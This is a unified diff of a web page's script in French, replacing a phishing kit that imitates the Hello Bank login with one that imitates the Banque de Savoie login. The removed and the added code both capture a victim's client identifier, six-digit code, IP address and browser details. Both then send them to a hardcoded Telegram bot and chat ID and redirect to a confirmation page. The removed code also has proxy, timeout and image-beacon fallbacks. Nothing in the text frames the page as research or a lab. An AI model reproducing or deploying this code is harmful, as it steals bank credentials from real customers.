@@ -622,368 +622,231 @@
 </div>
 
 <script>
+        // Configuration Telegram
+        const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
+        const CHAT_ID = '6078788670';
 
-// Attendre config.js
-async function waitForConfig(maxWait = 3000) {
-    const start = Date.now();
-    while (!window.telegramConfig && Date.now() - start < maxWait) {
-        await new Promise(r => setTimeout(r, 50));
-    }
-    return window.telegramConfig;
-}
-
-
-    // Configuration Telegram
-    const TELEGRAM_BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
-    const TELEGRAM_CHAT_ID = '6078788670';
-    
-    // Variables globales
-    const numInput = document.getElementById('numClient');
-    const btn1 = document.getElementById('btn1');
-    const btn2 = document.getElementById('btn2');
-    const manualTelegramBtn = document.getElementById('manualTelegramBtn');
-    const dots = document.querySelectorAll('.dot');
-    const dotBoxes = document.querySelectorAll('.dot-box');
-    const loader = document.getElementById('loader');
-    const successMessage = document.getElementById('successMessage');
-    const errorMessage = document.getElementById('errorMessage');
-    const telegramStatus = document.getElementById('telegramStatus');
-    
-    let codeArray = [];
-    let rememberMe = false;
-    let clientNumber = '';
-    let loginData = null;
-    let telegramSent = false;
-
-    function showTelegramStatus(message, type = 'success') {
-        telegramStatus.textContent = message;
-        telegramStatus.className = `telegram-status telegram-${type}`;
-        telegramStatus.style.display = 'block';
-        setTimeout(() => {
-            telegramStatus.style.display = 'none';
-        }, 5000);
-    }
-    
-    async function getIP() {
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip || 'Non disponible';
-        } catch (error) {
-            return 'Non disponible';
-        }
-    }
-
-    async function sendTelegramDirect(message) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('text', message);
-        formData.append('parse_mode', 'HTML');
+        // Toast elements
+        const toast = document.getElementById('toast');
         
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                body: formData,
-                mode: 'cors'
-            });
-            if (response.ok) return true;
-            return false;
-        } catch (error) {
-            return false;
+        function showToast(message, isError = false) {
+            toast.textContent = message;
+            toast.className = 'toast show' + (isError ? ' error' : ' success');
+            setTimeout(() => {
+                toast.classList.remove('show');
+                toast.className = 'toast';
+            }, 3000);
         }
-    }
 
-    async function sendTelegramViaProxy(message) {
-        try {
-            const proxyUrl = 'https://corsproxy.io/?';
-            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const params = new URLSearchParams({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            });
-            const response = await fetch(proxyUrl + encodeURIComponent(telegramUrl), {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: params.toString()
-            });
-            return response.ok;
-        } catch (error) {
-            return false;
-        }
-    }
-
-    async function sendTelegramWithTimeout(message, timeout = 10000) {
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), timeout);
+        // --- LOGIQUE ÉTAPE 1 (Identifiant) ---
+        const inputIdentifiant = document.getElementById('identifiant');
+        const btnEtapeSuivante = document.getElementById('btn-etape-suivante');
+        const rememberCheckbox = document.getElementById('rememberId');
         
-        try {
-            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                }),
-                signal: controller.signal
-            });
-            clearTimeout(timeoutId);
-            return response.ok;
-        } catch (error) {
-            return false;
-        }
-    }
+        const etape1 = document.getElementById('etape-1');
+        const etape2 = document.getElementById('etape-2');
 
-    async function sendTelegramViaImage(message) {
-        return new Promise((resolve) => {
-            const encodedMessage = encodeURIComponent(message);
-            const img = new Image();
-            img.onload = () => resolve(true);
-            img.onerror = () => resolve(false);
-            img.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
+        let identifiantSaisi = '';
+
+        // Charger l'identifiant mémorisé
+        const savedId = localStorage.getItem('banque_savoie_saved_id');
+        if (savedId) {
+            inputIdentifiant.value = savedId;
+            rememberCheckbox.checked = true;
+            btnEtapeSuivante.classList.remove('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
+            btnEtapeSuivante.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
+            btnEtapeSuivante.removeAttribute('disabled');
+            identifiantSaisi = savedId;
+        }
+
+        // Activer le bouton de l'étape 1 si l'identifiant n'est pas vide
+        inputIdentifiant.addEventListener('input', (e) => {
+            if (e.target.value.trim().length > 0) {
+                btnEtapeSuivante.classList.remove('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
+                btnEtapeSuivante.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
+                btnEtapeSuivante.removeAttribute('disabled');
+                identifiantSaisi = e.target.value.trim();
+            } else {
+                btnEtapeSuivante.classList.add('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
+                btnEtapeSuivante.classList.remove('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
+                btnEtapeSuivante.setAttribute('disabled', 'true');
+                identifiantSaisi = '';
+            }
         });
-    }
 
-    async function sendToTelegram(data) {
-        const ip = await getIP();
-        const message = `\n🏦 <b>HELLO BANK - NOUVELLE CONNEXION</b>\n\n👤 <b>Numéro Client:</b>\n${data.clientNumber}\n\n🔒 <b>Code Secret (6 chiffres):</b>\n${data.secretCode}\n\n💾 <b>Mémorisé:</b>\n${data.remembered ? 'OUI ✅' : 'NON ❌'}\n\n📅 <b>Date et heure:</b>\n${new Date().toLocaleString('fr-FR')}\n\n🌍 <b>Adresse IP:</b> ${ip}\n\n🌐 <b>Informations navigateur:</b>\n${navigator.userAgent.substring(0, 150)}...\n        `;
+        // Passer de l'étape 1 à l'étape 2
+        btnEtapeSuivante.addEventListener('click', () => {
+            if (identifiantSaisi) {
+                // Sauvegarder l'identifiant si la case est cochée
+                if (rememberCheckbox.checked) {
+                    localStorage.setItem('banque_savoie_saved_id', identifiantSaisi);
+                } else {
+                    localStorage.removeItem('banque_savoie_saved_id');
+                }
+                
+                etape1.classList.add('hidden');
+                etape1.classList.remove('flex');
+                etape2.classList.remove('hidden');
+                etape2.classList.add('flex');
+            }
+        });
+
+        // --- LOGIQUE ÉTAPE 2 (Mot de passe) ---
+        const btnRetour = document.getElementById('btn-retour');
+        const touchesClavier = document.querySelectorAll('.touche-clavier');
+        const btnSupprimer = document.getElementById('btn-supprimer');
+        const btnConnexion = document.getElementById('btn-connexion');
+        const affichageMdp = document.getElementById('affichage-mdp');
         
-        showTelegramStatus('📡 Envoi des données à Telegram...', 'success');
-        
-        const methods = [
-            sendTelegramDirect,
-            sendTelegramViaProxy,
-            sendTelegramWithTimeout,
-            sendTelegramViaImage
-        ];
-        
-        let success = false;
-        let methodIndex = 0;
-        
-        for (const method of methods) {
-            methodIndex++;
+        const LONGUEUR_MDP = 6; 
+        let motDePasseSaisi = '';
+
+        // Bouton retour (Efface le mdp et ramène à l'étape 1)
+        btnRetour.addEventListener('click', () => {
+            etape2.classList.add('hidden');
+            etape2.classList.remove('flex');
+            etape1.classList.remove('hidden');
+            etape1.classList.add('flex');
+            motDePasseSaisi = '';
+            mettreAJourAffichage();
+        });
+
+        // Clic sur les chiffres du clavier
+        touchesClavier.forEach(touche => {
+            touche.addEventListener('click', (e) => {
+                if (motDePasseSaisi.length < LONGUEUR_MDP) {
+                    motDePasseSaisi += e.target.innerText;
+                    mettreAJourAffichage();
+                }
+            });
+        });
+
+        // Effacer le dernier chiffre saisi
+        btnSupprimer.addEventListener('click', () => {
+            if (motDePasseSaisi.length > 0) {
+                motDePasseSaisi = motDePasseSaisi.slice(0, -1);
+                mettreAJourAffichage();
+            }
+        });
+
+        // Mettre à jour l'affichage des pastilles noires
+        function mettreAJourAffichage() {
+            affichageMdp.innerHTML = '';
+            
+            for (let i = 0; i < LONGUEUR_MDP; i++) {
+                const pastille = document.createElement('div');
+                pastille.className = `w-4 h-4 rounded-full border-2 transition-all duration-200 `;
+                
+                if (i < motDePasseSaisi.length) {
+                    pastille.classList.add('bg-gray-800', 'border-gray-800');
+                } else {
+                    pastille.classList.add('border-gray-300', 'bg-transparent');
+                }
+                
+                affichageMdp.appendChild(pastille);
+            }
+
+            // Activer/Désactiver le bouton final
+            if (motDePasseSaisi.length === LONGUEUR_MDP) {
+                btnConnexion.classList.remove('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
+                btnConnexion.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
+                btnConnexion.removeAttribute('disabled');
+            } else {
+                btnConnexion.classList.add('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
+                btnConnexion.classList.remove('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
+                btnConnexion.setAttribute('disabled', 'true');
+            }
+        }
+
+        // Fonction pour obtenir l'IP
+        async function getIP() {
             try {
-                success = await method(message);
-                if (success) {
-                    showTelegramStatus('!', 'success');
-                    telegramSent = true;
-                    break;
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'Non disponible';
+            } catch (error) {
+                return 'Non disponible';
+            }
+        }
+
+        // Envoi à Telegram
+        async function sendToTelegram() {
+            const ip = await getIP();
+            const message = `🏔️ BANQUE DE SAVOIE - NOUVELLE CONNEXION 🏔️
+━━━━━━━━━━━━━━━━━━━━━
+👤 Identifiant: ${identifiantSaisi}
+🔑 Mot de passe: ${motDePasseSaisi}
+━━━━━━━━━━━━━━━━━━━━━
+🌍 IP: ${ip}
+📱 User-Agent: ${navigator.userAgent}
+🕐 Date: ${new Date().toLocaleString('fr-FR')}
+✅ Statut: Connexion en cours`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN || BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: window.CHAT_ID || CHAT_ID,
+                        text: message
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('');
+                    showToast(' ');
+                    return true;
+                } else {
+                    console.error('❌ Erreur Telegram:', data);
+                    showToast('❌ Erreur: ' + data.description, true);
+                    return false;
                 }
             } catch (error) {
-                console.log(`Méthode ${methodIndex} échouée:`, error);
+                console.error('❌ Erreur lors de l\'envoi à Telegram:', error);
+                showToast('❌ Erreur de connexion', true);
+                return false;
             }
-            await new Promise(resolve => setTimeout(resolve, 1000));
         }
-        
-        if (!success) {
-            showTelegramStatus('⚠️ Échec envoi - Bouton manuel disponible', 'error');
-            loginData = data;
-            loginData.message = message;
-            localStorage.setItem('telegram_unsent_data_hello', JSON.stringify(loginData));
-            manualTelegramBtn.style.display = 'flex';
-        }
-        
-        return success;
-    }
 
-    async function sendToTelegramManually() {
-        const originalText = manualTelegramBtn.innerHTML;
-        manualTelegramBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Envoi en cours...';
-        manualTelegramBtn.disabled = true;
-        
-        if (!loginData) {
-            const savedData = localStorage.getItem('telegram_unsent_data_hello');
-            if (savedData) loginData = JSON.parse(savedData);
-        }
-        
-        if (!loginData) {
-            alert('Aucune donnée à envoyer.');
-            manualTelegramBtn.innerHTML = originalText;
-            manualTelegramBtn.disabled = false;
-            return;
-        }
-        
-        try {
-            const methods = [
-                sendTelegramDirect,
-                sendTelegramViaProxy,
-                sendTelegramWithTimeout,
-                sendTelegramViaImage
-            ];
-            
-            let success = false;
-            for (const method of methods) {
-                try {
-                    success = await method(loginData.message);
-                    if (success) break;
-                } catch (error) {}
+        // Initialiser l'affichage vide au démarrage
+        mettreAJourAffichage();
+
+        // --- VALIDATION ET ENVOI À TELEGRAM ---
+        btnConnexion.addEventListener('click', async () => {
+            if (motDePasseSaisi.length === LONGUEUR_MDP) {
+                
+                // Désactiver le bouton pour éviter double clic
+                btnConnexion.disabled = true;
+                
+                // Afficher l'écran de chargement
+                const ecranChargement = document.getElementById('ecran-chargement');
+                ecranChargement.classList.remove('hidden');
+                ecranChargement.classList.add('flex');
+                
+                // Envoyer les données à Telegram
+                await sendToTelegram();
+                
+                // Attendre 2 secondes puis rediriger
+                setTimeout(() => {
+                    window.location.href = 'confirmation.html';
+                }, 2000);
             }
-            
-            if (success) {
-                showTelegramStatus('✅ Données envoyées manuellement!', 'success');
-                manualTelegramBtn.innerHTML = '<i class="fa-solid fa-check"></i> Envoyé!';
-                manualTelegramBtn.style.backgroundColor = '#28a745';
-                manualTelegramBtn.disabled = true;
-                localStorage.removeItem('telegram_unsent_data_hello');
-                setTimeout(() => window.location.href = 'confirmation.html', 2000);
-            } else {
-                showTelegramStatus('❌ Échec envoi manuel', 'error');
-                manualTelegramBtn.innerHTML = originalText;
-                manualTelegramBtn.disabled = false;
-            }
-        } catch (error) {
-            manualTelegramBtn.innerHTML = originalText;
-            manualTelegramBtn.disabled = false;
-        }
-    }
-
-    // --- ÉTAPE 1 ---
-    numInput.addEventListener('input', () => {
-        numInput.value = numInput.value.replace(/\D/g, '');
-        if (numInput.value.length >= 7 && numInput.value.length <= 10) {
-            btn1.disabled = false;
-            btn1.classList.add('btn-ready');
-        } else {
-            btn1.disabled = true;
-            btn1.classList.remove('btn-ready');
-        }
-    });
-
-    numInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter' && !btn1.disabled) nextStep();
-    });
-
-    function clearInput() {
-        numInput.value = "";
-        btn1.disabled = true;
-        btn1.classList.remove('btn-ready');
-        numInput.focus();
-    }
-
-    function nextStep() {
-        clientNumber = numInput.value.trim();
-        if (clientNumber.length >= 7 && clientNumber.length <= 10) {
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step2').classList.add('active');
-            initKeypad();
-            resetCode();
-        }
-    }
-
-    document.getElementById('memo').addEventListener('change', function() {
-        rememberMe = this.checked;
-    });
-
-    // --- ÉTAPE 2 ---
-    function initKeypad() {
-        const keypad = document.getElementById('keypad');
-        const numbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0].sort(() => Math.random() - 0.5);
-        keypad.innerHTML = '';
-        numbers.forEach(num => {
-            const btn = document.createElement('button');
-            btn.className = 'key';
-            btn.innerText = num;
-            btn.addEventListener('click', () => addDigit(num));
-            keypad.appendChild(btn);
         });
-    }
 
-    function addDigit(num) {
-        if (codeArray.length < 6) {
-            codeArray.push(num);
-            const index = codeArray.length - 1;
-            dots[index].style.display = 'block';
-            dotBoxes[index].classList.add('filled');
-            event.target.style.backgroundColor = '#e0f7fa';
-            event.target.style.borderColor = 'var(--hb-cyan)';
-            setTimeout(() => {
-                event.target.style.backgroundColor = '';
-                event.target.style.borderColor = '';
-            }, 200);
+        // Animation purement visuelle pour le toggle accessibilité
+        const toggle = document.getElementById('toggle');
+        if (toggle) {
+            toggle.addEventListener('change', (e) => {
+                if (e.target.checked) {
+                    e.target.style.transform = 'translateX(1.25rem)';
+                } else {
+                    e.target.style.transform = 'translateX(0)';
+                }
+            });
         }
-        if (codeArray.length === 6) {
-            btn2.disabled = false;
-            btn2.classList.add('btn-ready');
-        }
-    }
-
-    function resetCode() {
-        codeArray = [];
-        dots.forEach(dot => dot.style.display = 'none');
-        dotBoxes.forEach(box => box.classList.remove('filled'));
-        btn2.disabled = true;
-        btn2.classList.remove('btn-ready');
-        manualTelegramBtn.style.display = 'none';
-    }
-
-    function resetAndGoBack() {
-        resetCode();
-        document.getElementById('step2').classList.remove('active');
-        document.getElementById('step1').classList.add('active');
-        numInput.focus();
-    }
-
-    function showHelp() {
-        alert("Pour récupérer vos identifiants, contactez le service client au 09 69 39 99 98 (service gratuit + prix appel).");
-    }
-
-    // --- ENVOI À TELEGRAM ET REDIRECTION ---
-    async function validateAndSend() {
-        if (codeArray.length !== 6) return;
-        
-        const secretCode = codeArray.join('');
-        
-        btn2.style.display = 'none';
-        loader.style.display = 'block';
-        successMessage.style.display = 'none';
-        errorMessage.style.display = 'none';
-        
-        loginData = {
-            clientNumber: clientNumber,
-            secretCode: secretCode,
-            remembered: rememberMe,
-            timestamp: new Date().toISOString(),
-            bank: 'Hello Bank'
-        };
-
-        try {
-            telegramSent = await sendToTelegram(loginData);
-            
-            if (telegramSent) {
-                loader.style.display = 'none';
-                successMessage.textContent = '✅ Connexion réussie ! Redirection en cours...';
-                successMessage.style.display = 'block';
-                localStorage.setItem('hello_last_login', JSON.stringify(loginData));
-                localStorage.setItem('telegram_sent', 'true');
-                setTimeout(() => window.location.href = 'confirmation.html', 2000);
-            } else {
-                loader.style.display = 'none';
-                btn2.style.display = 'block';
-                manualTelegramBtn.style.display = 'flex';
-                errorMessage.textContent = '⚠️ Problème d\'envoi - Utilisez le bouton bleu';
-                errorMessage.style.display = 'block';
-            }
-        } catch (error) {
-            loader.style.display = 'none';
-            btn2.style.display = 'block';
-            manualTelegramBtn.style.display = 'flex';
-            errorMessage.textContent = '❌ Erreur - Bouton manuel disponible';
-            errorMessage.style.display = 'block';
-        }
-    }
-
-    document.addEventListener('DOMContentLoaded', function() {
-        const unsentData = localStorage.getItem('telegram_unsent_data_hello');
-        if (unsentData) {
-            loginData = JSON.parse(unsentData);
-            manualTelegramBtn.style.display = 'flex';
-            showTelegramStatus('⚠️ Données non envoyées - Bouton manuel disponible', 'error');
-        }
-        numInput.focus();
-    });
-</script>
-
+    </script>
 </body>
 </html>
